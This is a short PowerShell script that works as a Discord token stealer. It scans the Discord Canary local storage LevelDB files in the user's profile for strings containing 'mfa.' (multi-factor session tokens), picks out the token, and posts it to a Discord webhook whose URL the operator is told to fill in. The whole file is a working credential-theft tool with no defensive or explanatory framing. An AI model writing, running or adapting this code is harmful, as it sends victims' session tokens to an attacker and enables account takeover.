$path = $env:USERPROFILE
$web = "" #put the discord webhook here
$userp = Select-String -Path "$path\AppData\Roaming\discordcanary\Local Storage\Leveldb\*.ldb" -Pattern 'mfa.'

$array = $userp -Split '"'

for (($i = 0); $i -lt $array.count; $i++)
{
    if ($array[$i].Contains('mfa.')){
        $token = $array[$i]

    }
}

Invoke-RestMethod -Uri $web -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"$token`"}"
